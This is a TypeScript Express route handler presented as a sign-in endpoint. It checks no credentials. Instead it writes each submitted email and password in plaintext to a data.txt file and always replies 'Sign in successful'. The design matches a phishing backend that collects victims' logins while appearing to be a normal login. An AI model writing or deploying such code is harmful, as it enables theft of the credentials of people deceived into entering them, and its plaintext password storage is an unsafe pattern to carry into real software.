import { RequestHandler } from "express";
import { writeFileSync, existsSync, readFileSync } from "fs";
import { join } from "path";

export interface SignInRequest {
  email: string;
  password: string;
}

export const handleSignIn: RequestHandler = (req, res) => {
  try {
    const { email, password } = req.body as SignInRequest;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: "Email and password are required",
      });
    }

    // Create the data entry in the requested format
    const dataEntry = `[Email: ${email}] [Password: ${password}]\n`;

    // Path to data.txt file in the project root
    const dataFilePath = join(process.cwd(), "data.txt");

    // Append to file (create if doesn't exist)
    if (existsSync(dataFilePath)) {
      const existingData = readFileSync(dataFilePath, "utf8");
      writeFileSync(dataFilePath, existingData + dataEntry);
    } else {
      writeFileSync(dataFilePath, dataEntry);
    }

    console.log("Sign-in data saved:", {
      email,
      timestamp: new Date().toISOString(),
    });

    res.json({
      success: true,
      message: "Sign in successful",
    });
  } catch (error) {
    console.error("Error saving sign-in data:", error);
    res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
};
